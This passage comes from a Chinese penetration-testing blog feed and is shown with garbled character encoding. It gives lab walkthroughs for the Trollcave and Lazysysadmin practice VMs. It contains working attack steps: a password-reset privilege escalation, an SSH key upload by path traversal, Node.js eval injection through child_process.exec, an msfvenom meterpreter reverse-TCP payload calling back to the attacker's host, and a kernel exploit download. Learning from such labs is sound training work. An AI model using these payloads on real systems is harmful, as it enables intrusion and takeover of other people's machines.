</p><p>è€Œä¸”æ˜¯åŸºäºrailæ¥å®ç°çš„</p><h3 id="2-ä»åŠŸèƒ½ä¸Šåˆ†æé€»è¾‘æ¼æ´"><a href="#2-ä»åŠŸèƒ½ä¸Šåˆ†æé€»è¾‘æ¼æ´" class="headerlink" title="2.ä»åŠŸèƒ½ä¸Šåˆ†æé€»è¾‘æ¼æ´"></a>2.ä»åŠŸèƒ½ä¸Šåˆ†æé€»è¾‘æ¼æ´</h3><p>1.é‡ç½®å¯†ç æ¼æ´ï¼š</p><p>â‘ æ¼æ´å‘ç°ï¼Œå‘ç°é‡ç½®å¯†ç çš„è·¯å¾„</p><p>â‘¡æ¼æ´åˆ©ç”¨ï¼Œä¿®æ”¹è¶…çº§ç®¡ç†å‘˜çš„å¯†ç </p><h2 id="4-åˆ©ç”¨æ¼æ´"><a href="#4-åˆ©ç”¨æ¼æ´" class="headerlink" title="4.åˆ©ç”¨æ¼æ´"></a>4.åˆ©ç”¨æ¼æ´</h2><p>1.ç»è¿‡å¯¹implemented a password_resets resource in railsèµ„æ–™æŸ¥é˜…(è¿™é‡Œæœ‰ä¸¤ä¸ªå…³é”®è¯password_resetså’Œrailsï¼Œgoogleä¸€ä¸‹ï¼Œå‘ç°è¿™ä¹ˆä¸€ä¸ªç½‘ç«™<a href="https://www.railstutorial.org/book/password_reset)ï¼š" target="_blank" rel="noopener">https://www.railstutorial.org/book/password_reset)ï¼š</a></p><p>/password_resets/newå¯ä»¥å¯¹memberæˆå‘˜çš„å¯†ç è¿›è¡Œä¿®æ”¹ä½†æ˜¯å¯¹Kingæ— æ³•è¿›è¡Œä¿®æ”¹</p><p><a href="http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=xer" target="_blank" rel="noopener">http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=xer</a></p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//æœç‹—æˆªå›¾20å¹´12æœˆ28æ—¥1441_1.png" style="zoom:80%;"><p>2.ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå‚ç›´è¶Šæƒçš„æ¼æ´ï¼š</p><p><a href="http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=King" target="_blank" rel="noopener">http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=King</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51446_3.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51445_2.png" alt></p><p>è¯´æ˜å·²ç»å°†Kingçš„å¯†ç æˆåŠŸä¿®æ”¹äº†</p><p>ç„¶åç™»é™†ï¼šsuccessï¼ï¼ï¼</p><p>3.æ¥ä¸‹æ¥å¼€å§‹åˆ©ç”¨superadminæ¥å¯¹è¯¥ç½‘é¡µè¿›è¡Œå­¦ä¹ ï¼ˆå˜¿å˜¿å˜¿ï¼‰</p><p>â‘ åˆ›å»ºsshå…¬é’¥ï¼š</p><p>a.åœ¨æ”»å‡»æœºåˆ©ç”¨sshå‘½ä»¤åˆ›å»ºä¸€ä¸ªpublic keyï¼Œæ¥è¿æ¥é¶æœºä¸Šä½ å…ˆè¦è¿æ¥çš„ç”¨æˆ·</p><p>é€šè¿‡ä¿¡æ¯æ”¶é›†ï¼š</p><p><u>å˜¿ï¼Œä¼™è®¡ï¼Œå¦‚æœæˆ‘è¦åœ¨ç½‘ç«™ä¸Šåšæ›´å¤šçš„å·¥ä½œï¼Œæˆ‘çœŸçš„éœ€è¦sudoè®¿é—®ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“å¯¹æˆ‘æ¥è¯´äº¤äº’ä½¿ç”¨railsç”¨æˆ·æ˜¯ä¸€ä¸ªå¤šå¥½çš„ä¸»æ„ï¼Œä¹Ÿè®¸æˆ‘ä»¬åº”è¯¥åˆ†å¼€ï¼Œæˆ‘æ¢¦å¯ä»¥æ±‚çš„coderguy in /etc/sudoersâ€¦</u></p><p>å¾—åˆ°ç”¨æˆ·ï¼š<strong>rails</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51557_4.png" alt></p><p>ç„¶åæ”¶é›†åˆ°ä¸€ä¸ªè·¯å¾„ï¼š/home/rails/.ssh/<u>authorized_keys</u>è¿™ä¸ªåœ°æ–¹æ˜¯æ–‡ä»¶åå¯ä»¥è‡ªè¡Œä¿®æ”¹</p><p>b.æ¥ä¸‹æ¥åœ¨kaliä¸Šä¸ºå…¶åˆ›å»ºå…¬é’¥</p><pre><code>ssh-keygen -Cï¼ˆä¸ºæ‰€åˆ›å»ºçš„å…¬é’¥åšæ³¨é‡Šï¼‰rails@192.168.204.140</code></pre><p>â‘¡æŠŠpublic keyä¸Š ä¼ åˆ°é¶æœºä¸Šï¼š</p><p>a.åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ </p><p>b.æŒ‰å…¬é’¥å­˜å‚¨çš„è·¯å¾„ï¼ˆé»˜è®¤Defaultï¼‰ä¸Šä¼ å…¬é’¥</p><p><strong>../../../../../../home/rails/.ssh/authorized_keys</strong>ï¼ˆä¸Šä¼ çš„åå­—ï¼‰æ³¨æ„è¿™é‡Œçš„åå­—ä¸€å®šè¦æ˜¯authorized_keys</p><p>â‘¢åœ¨æ”»å‡»æœºåˆ©ç”¨å…¬é’¥å»è¿æ¥é¶æœºä¸Šçš„ç”¨æˆ·</p><pre><code>ssh rails@192.168.204.140 -i xxxï¼ˆæ­¤å¤„çš„åå­—è¦ä¸ä½ ä¸Šä¼ çš„xxx.pubæ–‡ä»¶åå­—ç›¸åŒï¼Œä¸ç„¶ä¼šè¿æ¥ä¸ä¸Šï¼ï¼ï¼ï¼ï¼‰Last login: Thu Jul 11 03:57:36 2019 from 192.168.198.136$ ifconfig  inet addr:192.168.204.140$ whoamirails$ ls /homecoderguy  dave    dragon    king  rails          </code></pre><h3 id="5-å…³é”®æ–‡ä»¶ä»£ç åˆ†æ"><a href="#5-å…³é”®æ–‡ä»¶ä»£ç åˆ†æ" class="headerlink" title="5.å…³é”®æ–‡ä»¶ä»£ç åˆ†æ"></a>5.å…³é”®æ–‡ä»¶ä»£ç åˆ†æ</h3><pre><code>$vim /home/king/calc/calc.jshttp.createServer(onRequest).listen(8888, &#39;127.0.0.1&#39;)//è¯´æ˜åœ¨é¶æœºä¸Šåˆ›å»ºäº†ä¸€ä¸ªæœåŠ¡8ç«¯å£8888åˆ†ærouteï¼ˆè·¯ç”±ï¼‰å‡½æ•°ï¼š##è§£é‡Šï¼šæ ¹æ®urlé‡Œé¢ä¸åŒçš„åœ°å€ï¼Œåˆ†åˆ«è°ƒç”¨ä¸ä¹‹å¯¹åº”çš„å‡½æ•°æ¥å“åº”function calc(pathname, request, query, response){        sum = query.split(&#39;=&#39;)[1];        #å°†ç­‰å·åé¢çš„å€¼èµ‹ç»™sum        console.log(sum)        #å…¶å®è¿™ä¸ªæ–¹æ³•å’Œalertæ–¹æ³•ç±»ä¼¼ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯è¯¥æ–¹æ³•æ˜¯æ˜¾ç¤ºåœ¨æ§åˆ¶å°çš„ï¼Œè€Œalert()æ–¹æ³•æ˜¯æ˜¾ç¤ºåœ¨æµè§ˆå™¨ä¸Šçš„        response.writeHead(200, {&quot;Content-Type&quot;: &quot;text/plain&quot;});#å‘è¯·æ±‚çš„å®¢æˆ·ç«¯å‘é€å“åº”å¤´ã€‚ è¯¥å‡½æ•°åœ¨ä¸€ä¸ªè¯·æ±‚å†…æœ€å¤šåªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œå¦‚æœä¸è°ƒç”¨ï¼Œåˆ™ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå“åº”å¤´ã€‚statusCode HTTPçŠ¶æ€ç ï¼Œå¦‚200(è¯·æ±‚æˆåŠŸï¼‰ï¼Œ404ï¼ˆæœªæ‰¾åˆ°ï¼‰ç­‰ã€‚        response.end(eval(sum).toString());        #åœæ­¢å¤„ç†æ–‡ä»¶çš„è„šæœ¬ä»£ç ï¼Œå¹¶ä¸”è¿”å›å½“å‰äº§ç”Ÿçš„å†…å®¹}</code></pre><p> response.end(eval(sum).toString());</p><p>eval()æ‰§è¡Œresponseå¯¹è±¡endï¼ˆè®¡ç®—å…¬å¼ï¼‰ï¼Œä¹‹åæŠŠè®¡ç®—å…¬å¼çš„ç»“æœè¿”å›åˆ°æµè§ˆå™¨</p><p>egï¼š<a href="http://192.168.204.140/?sum=1+1ç„¶åé€šè¿‡endæ¥æŠŠç»“æœ2åé¦ˆç»™æµè§ˆå™¨" target="_blank" rel="noopener">http://192.168.204.140/?sum=1+1ç„¶åé€šè¿‡endæ¥æŠŠç»“æœ2åé¦ˆç»™æµè§ˆå™¨</a></p><p>egï¼š<a href="http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)" target="_blank" rel="noopener">http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)</a></p><p>è¿™é‡Œä¼šé€šè¿‡requireï¼ˆï¼‰åœ¨æœ¬åœ°æ“ä½œç³»ç»Ÿä¸Šå¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åé€šè¿‡ä¸Šè¿°å­è¿›ç¨‹å»æ‰§è¡Œï¼ˆexecï¼‰whoamiè¿™ä¸ªshellå‘½ä»¤ï¼Œç„¶åå°†ä¸Šè¿°å†…å®¹æˆ¿å­evalï¼ˆï¼‰é‡Œé¢ï¼Œç»“æœå°±ä¼šåœ¨æœ¬åœ°æ“ä½œç³»ç»Ÿä¸ŠçœŸæ­£æ‰§è¡Œwhoami</p><p>è¸©å‘ï¼šå¦‚æœcalc.jsæ–‡ä»¶å› ä¸ºæ“ä½œå¤±è¯¯ä¸å°å¿ƒæŠŠå†…å®¹å¹²æ²¡äº†ï¼Œå°±é‡ç½®è™šæ‹Ÿæœº</p><h3 id="6-ä»£ç æ¼æ´éªŒè¯"><a href="#6-ä»£ç æ¼æ´éªŒè¯" class="headerlink" title="6.ä»£ç æ¼æ´éªŒè¯"></a>6.ä»£ç æ¼æ´éªŒè¯</h3><p>æ¥ä¸‹æ¥ä½¿ç”¨è™šæ‹Ÿæœºæ¥æ¨¡æ‹Ÿä¸Šè¿°çš„åœ¨URLé‡Œé¢æ‰§è¡Œçš„æ“ä½œ</p><p>1.éªŒè¯8888ç«¯å£æœåŠ¡æ˜¯ä¸æ˜¯å¯åŠ¨</p><pre><code>netstat -antpåˆ—å‡ºå½“å‰ä¸»æœºä¸Šæ‰€æœ‰å¼€æ”¾çš„ç«¯å£|grep 8888åªçœ‹ç«¯å£8888æ˜¯å¦å¯åŠ¨netstat -antp | grep 8888</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51925_5.png" alt></p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=1+1&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51937_6.png" alt></p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;whoani&#39;)&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51941_7.png" alt></p><p>å¦‚æœå‘½ä»¤æ‰§è¡Œä¸”æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜å¯èƒ½å­˜åœ¨shellä¸Šä¼ æ¼æ´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰å¯ä»¥åˆ©ç”¨çš„åå¼¹shell</p><h3 id="7-ç”Ÿæˆå¹¶ä¸Šä¼ shell"><a href="#7-ç”Ÿæˆå¹¶ä¸Šä¼ shell" class="headerlink" title="7.ç”Ÿæˆå¹¶ä¸Šä¼ shell"></a>7.ç”Ÿæˆå¹¶ä¸Šä¼ shell</h3><p>è¿™é‡Œä¸ä¼šå¾—åˆ°å‘½ä»¤çš„è¾“å‡ºï¼Œè€Œæ˜¯è¿”å›äº†[object Object]ï¼Œç”±æ­¤çŒœæµ‹sumå‚æ•°é‡Œçš„whoamiè¿™ä¸ªå‘½ä»¤è¢«æ‰§è¡Œäº†ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨è¿™é‡Œè§¦å‘ä¸€ä¸ªshellã€‚</p><p><strong>1.ä½¿ç”¨msfvenomåˆ›å»ºshellï¼š</strong></p><p>msfvenom -p linux/x64/meterpreter_reverse_tcp  â†’ è®¾ç½®payload</p><p>-f elf  â†’  ç”Ÿæˆæ ¼å¼</p><p>-o shell â†’ ç”Ÿæˆè·¯å¾„ï¼ˆè¾“å‡ºæ–‡ä»¶åå­—ï¼‰</p><p>LHOST=192.168.110.6   â†’    Kaliåœ°å€</p><p>LPORT=6666      â†’    åå¼¹ç«¯å£</p><p>å…ˆå¯åŠ¨msfconsole,ä¹‹åè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p><pre><code>msf &gt; msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o demo -a x64 --platform linux LHOST=192.168.204.138 LPORT=6666</code></pre><p>2.åˆ©ç”¨æ–‡ä»¶æ¼æ´ä¸Šä¼ shell</p><p>è·¯å¾„ï¼š/tmp/demo</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A52034_8.png" alt></p><p>å¯ä»¥çœ‹å‡ºä¸Šä¼ æ–‡ä»¶æˆåŠŸ</p><p>3.åå¼¹shell</p><pre><code>msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload linux/x64/meterpreter_reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.110.6msf exploit(handler) &gt; set LPORT 6666msf exploit(handler) &gt; run -j</code></pre><pre><code>cd /tmp./yshell</code></pre><p>å‘ç°å› ä¸ºæƒé™é—®é¢˜yshellæ— æ³•åå¼¹</p><p>4.ç¼–å†™å¯åŠ¨shellçš„è„šæœ¬(åœ¨tmpç›®å½•ä¸‹)</p><p>å› ä¸ºrailsç”¨æˆ·æ²¡æœ‰ä¸Šä¼ æ‰§è¡Œshellçš„æƒé™</p><pre><code>vim run.sh#!/bin/bashsudo cp /tmp/shell1 /home/king/shell1sudo chown king:king /home/king/shell1(chownï¼š ä¿®æ”¹æ‰€å±ç”¨æˆ·ä¸ç»„ã€‚å°†shell1æ‹¥æœ‰è€…ä¸ç¾¤ç»„æ”¹ä¸ºking)sudo chmod a+x /home/king/shell1sudo /home/king/shell1</code></pre><p>å¯¹chmodå‘½ä»¤çš„å›é¡¾ï¼š</p><p>ç¬¦å·ç±»å‹æ”¹å˜æ–‡ä»¶æƒé™æ–¹å¼ï¼š</p><p>è¿˜æœ‰ä¸€ä¸ªæ”¹å˜æƒé™çš„æ–¹æ³•ï¼Œä»ä¹‹å‰çš„ä»‹ç»ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒåŸºæœ¬ä¸Šå°±ä¹ä¸ªæƒé™åˆ†åˆ«æ˜¯ï¼š</p><ul><li>userï¼šç”¨æˆ·</li><li>groupï¼šç»„</li><li>othersï¼šå…¶ä»–</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ <strong>u, g, o</strong> æ¥ä»£è¡¨ä¸‰ç§èº«ä»½çš„æƒé™ã€‚</p><p>æ­¤å¤–ï¼Œ <strong>a</strong> åˆ™ä»£è¡¨ <strong>all</strong>ï¼Œå³å…¨éƒ¨çš„èº«ä»½ã€‚è¯»å†™çš„æƒé™å¯ä»¥å†™æˆ <strong>r, w, x</strong>ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ä½¿ç”¨ä¸‹è¡¨çš„æ–¹å¼æ¥çœ‹ï¼š</p><table><thead><tr><th align="center">chmod</th><th>u g o a</th><th>+(åŠ å…¥) -(é™¤å») =(è®¾å®š)</th><th>r w x</th><th>æ–‡ä»¶æˆ–ç›®å½•</th></tr></thead><tbody><tr><td align="center"></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>å¦‚æœæˆ‘ä»¬éœ€è¦å°†æ–‡ä»¶æƒé™è®¾ç½®ä¸º <strong>-rwxr-xrâ€“</strong> ï¼Œå¯ä»¥ä½¿ç”¨ <strong>chmod u=rwx,g=rx,o=r æ–‡ä»¶å</strong> æ¥è®¾å®š:</p><pre><code>#  touch test1    // åˆ›å»º test1 æ–‡ä»¶# ls -al test1    // æŸ¥çœ‹ test1 é»˜è®¤æƒé™-rw-r--r-- 1 root root 0 Nov 15 10:32 test1# chmod u=rwx,g=rx,o=r  test1    // ä¿®æ”¹ test1 æƒé™# ls -al test1-rwxr-xr-- 1 root root 0 Nov 15 10:32 test1</code></pre><p>è€Œå¦‚æœæ˜¯è¦å°†æƒé™å»æ‰è€Œä¸æ”¹å˜å…¶ä»–å·²å­˜åœ¨çš„æƒé™å‘¢ï¼Ÿä¾‹å¦‚è¦æ‹¿æ‰å…¨éƒ¨äººçš„å¯æ‰§è¡Œæƒé™ï¼Œåˆ™ï¼š</p><pre><code>#  chmod  a-x test1# ls -al test1-rw-r--r-- 1 root root 0 Nov 15 10:32 test1</code></pre><p>5.è¿è¡Œè„šæœ¬</p><pre><code>./run.sh</code></pre><p>ä½†æ˜¯å› ä¸ºæƒé™ä¸å¤Ÿï¼Œè„šæœ¬æ— æ³•è¿è¡Œ</p><p>å› ä¸º/home/kingç›®å½•ä¸‹çš„calc</p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;/tmp/run.sh&#39;)&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8829%E6%97%A51902_1.png" alt></p><p>ç„¶åæ²¡æœ‰åå¼¹shell</p><p>æŸ¥çœ‹äº†ä¸€ä¸‹kingç›®å½•ä¸‹ï¼Œå¹¶æ²¡æœ‰yshellï¼Œä¹Ÿå°±æ˜¯è¯´è„šæœ¬æ²¡æœ‰è¿è¡Œ</p><pre><code>chmod a+x run.js#èµ‹äºˆå¯æ‰§è¡Œæƒé™</code></pre><p>ç„¶åå†curlæˆåŠŸåå¼¹shell</p><p>python -c â€˜import pty; pty.spawn(â€œ/bin/bashâ€)â€™</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8802%E6%97%A50052_1.png" alt></p><h2 id="å¦ä¸€ç§æ–¹æ³•ï¼ˆé’ˆå¯¹ubantuçš„ç‰ˆæœ¬æ¼æ´è¿›è¡Œææƒï¼‰ï¼š"><a href="#å¦ä¸€ç§æ–¹æ³•ï¼ˆé’ˆå¯¹ubantuçš„ç‰ˆæœ¬æ¼æ´è¿›è¡Œææƒï¼‰ï¼š" class="headerlink" title="å¦ä¸€ç§æ–¹æ³•ï¼ˆé’ˆå¯¹ubantuçš„ç‰ˆæœ¬æ¼æ´è¿›è¡Œææƒï¼‰ï¼š"></a>å¦ä¸€ç§æ–¹æ³•ï¼ˆé’ˆå¯¹ubantuçš„ç‰ˆæœ¬æ¼æ´è¿›è¡Œææƒï¼‰ï¼š</h2><h3 id="1-sshåˆ›å»ºå¥½shell"><a href="#1-sshåˆ›å»ºå¥½shell" class="headerlink" title="1.sshåˆ›å»ºå¥½shell"></a>1.sshåˆ›å»ºå¥½shell</h3><p>uname -aå¾—ï¼š<br>Linux trollcave 4.4.0-197-generic #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><p><strong>cat /proc/versio</strong>nå¾—ï¼š</p><p>Linux version 4.4.0-197-generic (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020</p><p>2.å¾—çŸ¥ubantuå’Œlinuxç‰ˆæœ¬ä¿¡æ¯</p><p>æ‡‚<del>~</del></p><pre><code>searchsploit 4.4.0-197</code></pre><p> Exploits: No Result<br>Shellcodes: No Result</p><p>æ˜¯åœ¨ä¸‹ä¸é…äº†</p><p>ç™¾åº¦<a href="https://www.cnblogs.com/hookjoy/p/8616250.html" target="_blank" rel="noopener">Ubuntu16.04 æœ¬åœ°ææƒæ¼æ´å¤æµ‹è¿‡ç¨‹</a></p><pre><code>rails@trollcave:/proc/sys/kernel$ cat unprivileged_bpf_disabled 0</code></pre><p><em><em>1ï¼Œä¸‹è½½pocæ–‡ä»¶ upstream44.c<br>ä¸‹è½½åœ°å€ï¼š<a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/up â€¦ mp;isappinstalled=0</a></em></em></p><p>ä¸‹è½½ç‰©ç†æœºä¸Šä¼ kaliä¸Šé¢å°±è¡Œ</p><pre><code>root@kali1:~/æ¡Œé¢/trollcave# gcc -o upstream upstream44.c</code></pre><p>å¤åˆ¶ï¼Œåˆ©ç”¨ç½‘ç«™çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¼ åˆ°/tmp/.Test-unix/666å¹¶èµ‹äºˆå¯æ‰§è¡Œå‘½ä»¤ï¼Œç»“æœå‡ºé—®é¢˜äº†</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥é—¨ </tag>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lazysysadminæ¸—é€åˆæ¢</title>
      <link href="/2020/12/26/idontcare/"/>
      <url>/2020/12/26/idontcare/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ç®€å•ä»‹ç»ï¼šä¸€ä¸ªç®€å•çš„ç¤¾åŒºå®£ä¼ ç½‘ç«™"><a href="#ç®€å•ä»‹ç»ï¼šä¸€ä¸ªç®€å•çš„ç¤¾åŒºå®£ä¼ ç½‘ç«™" class="headerlink" title="ç®€å•ä»‹ç»ï¼šä¸€ä¸ªç®€å•çš„ç¤¾åŒºå®£ä¼ ç½‘ç«™"></a>ç®€å•ä»‹ç»ï¼šä¸€ä¸ªç®€å•çš„ç¤¾åŒºå®£ä¼ ç½‘ç«™</h1><h2 id="IDontCareæ¸—é€æµ‹è¯•ï¼š"><a href="#IDontCareæ¸—é€æµ‹è¯•ï¼š" class="headerlink" title="IDontCareæ¸—é€æµ‹è¯•ï¼š"></a>IDontCareæ¸—é€æµ‹è¯•ï¼š</h2><h3 id="1-ä¸»æœºå‘ç°ï¼š"><a href="#1-ä¸»æœºå‘ç°ï¼š" class="headerlink" title="1.ä¸»æœºå‘ç°ï¼š"></a>1.ä¸»æœºå‘ç°ï¼š</h3><h4 id="å‘ç°ä¸»æœºçš„ipåœ°å€ï¼š"><a href="#å‘ç°ä¸»æœºçš„ipåœ°å€ï¼š" class="headerlink" title="å‘ç°ä¸»æœºçš„ipåœ°å€ï¼š"></a>å‘ç°ä¸»æœºçš„ipåœ°å€ï¼š</h4><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>-sPè¢«å‘ç°ä¸»æœºæ‰€æœ‰åœ¨çš„ç½‘æ®µï¼ˆé€šè¿‡pingå‘½ä»¤ï¼‰</p><pre><code>nmap -sP 127.0.0.0/24</code></pre><p>æ ¹æ®macåœ°å€00:0C:29:E3:72:75æ‰¾åˆ°ipåœ°å€</p><p>192.168.204.13913</p><h3 id="2-æœåŠ¡å‘ç°ï¼š"><a href="#2-æœåŠ¡å‘ç°ï¼š" class="headerlink" title="2.æœåŠ¡å‘ç°ï¼š"></a>2.æœåŠ¡å‘ç°ï¼š</h3><h4 id="å‘ç°ä¸»æœºä¸Šçš„å¼€æ”¾çš„ç«¯å£ï¼š"><a href="#å‘ç°ä¸»æœºä¸Šçš„å¼€æ”¾çš„ç«¯å£ï¼š" class="headerlink" title="å‘ç°ä¸»æœºä¸Šçš„å¼€æ”¾çš„ç«¯å£ï¼š"></a>å‘ç°ä¸»æœºä¸Šçš„å¼€æ”¾çš„ç«¯å£ï¼š</h4><pre><code>nmap -sSï¼ˆåŠå¼€æ”¾å¼æ‰«æï¼ŒåŠ å¿«é€Ÿåº¦ï¼‰ -O(æ“ä½œç³»ç»Ÿçš„ä¿¡æ¯) -p 1-65536 -T4ä½†æ˜¯è¿™é‡Œæˆ‘ä½¿ç”¨ï¼šnmap -sS -Pn -n -A 192.168.204.139</code></pre><p>å‘ç°ç«¯å£ï¼š</p><p>22ï¼ˆsshï¼‰ </p><p>80ï¼ˆhttpï¼‰</p><p>3306ï¼ˆmysqlï¼‰</p><p>139</p><p>445</p><p>6667</p><p>ç„¶åé’ˆå¯¹å¾—åˆ°çš„ç«¯å£è¿›è¡Œå®ä½“åŒ–æµè§ˆ</p><h3 id="3-å…³é”®ç›®å½•æ‰«æï¼š"><a href="#3-å…³é”®ç›®å½•æ‰«æï¼š" class="headerlink" title="3.å…³é”®ç›®å½•æ‰«æï¼š"></a>3.å…³é”®ç›®å½•æ‰«æï¼š</h3><p>1.æ ¹æ®dirbæ¥å¯¹è¯¥ç½‘ç«™è¿›è¡Œæ‰«ææ¥ç¡®å®šä»–ä¸‹é¢æœ‰å“ªä¸€äº›å­ç›®å½•</p><pre><code>dirb http://192.168.204.139</code></pre><p>å‘ç°ï¼š</p><p><a href="http://192.168.204.139/phpmyadmin/" target="_blank" rel="noopener">http://192.168.204.139/phpmyadmin/</a></p><p>å¹¶æ²¡æœ‰å‘ç°ä¸œè¥¿ï¼Œåªæ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢</p><p><a href="http://192.168.204.139/wordpress/" target="_blank" rel="noopener">http://192.168.204.139/wordpress/</a></p><p>å‘ç°äº†ä¸€ä¸ªåå­—ï¼štogie</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52215_1.png" alt></p><h3 id="4-æŸ¥çœ‹æ˜¯å¦æœ‰å…±äº«ç›®å½•"><a href="#4-æŸ¥çœ‹æ˜¯å¦æœ‰å…±äº«ç›®å½•" class="headerlink" title="4.æŸ¥çœ‹æ˜¯å¦æœ‰å…±äº«ç›®å½•"></a>4.æŸ¥çœ‹æ˜¯å¦æœ‰å…±äº«ç›®å½•</h3><p>1.é€šè¿‡enum4linuxæ¥æšä¸¾é¶æœºçš„å…±äº«ç›®å½•</p><pre><code>enum4linux 192.168.204.139</code></pre><p>ä¼šå‘ç°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52244_2.png" alt></p><p>share$ç›®å½•</p><p>å¹¶ä¸”å‘ç°å…è®¸ä½¿ç”¨ç©ºå‚è¿›è¡Œç™»å½•</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52302_3.png" alt></p><p>3.é€šè¿‡mountå‘½ä»¤è¯·æ±‚ä¸€ä¸‹å…±äº«èµ„æºï¼ˆæŒ‚è½½ï¼‰</p><pre><code>mount -t cifs -o username=&#39; &#39;,password=&#39;&#39; 